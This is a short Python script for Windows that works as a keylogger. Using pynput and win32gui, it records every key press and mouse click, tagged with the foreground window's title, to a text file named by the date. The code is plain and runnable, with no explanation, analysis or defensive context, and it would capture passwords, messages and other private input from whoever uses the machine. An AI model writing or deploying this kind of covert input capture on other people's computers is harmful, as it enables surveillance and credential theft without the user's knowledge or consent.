from pynput.keyboard import Listener  as KeyboardListener
from pynput.mouse    import Listener  as MouseListener
from pynput.keyboard import Key
import logging
import win32gui
from win32gui import GetWindowText, GetForegroundWindow
import datetime

dd=datetime.date.today()

logging.basicConfig(filename=(str(dd)+".txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def getwindow():
    temp=win32gui.GetForegroundWindow()
    windowdata=win32gui.GetWindowText(temp)
    return windowdata


def end_rec(key):
    return
    logging.info(str(key))

def on_press(key):
    window=getwindow()
    logging.info('\tKey pressed at '+window+'\t'+str(key))

def on_move(x, y):
    return
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        window=getwindow()
        logging.info('\tMouse clicked on {0} ({1}, {2}) with {3}'.format(window, x, y, button))

def on_scroll(x, y, dx, dy):
    return
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))


with MouseListener(on_click=on_click, on_scroll=on_scroll) as listener:
    with KeyboardListener(on_press=on_press) as listener:
        listener.join()
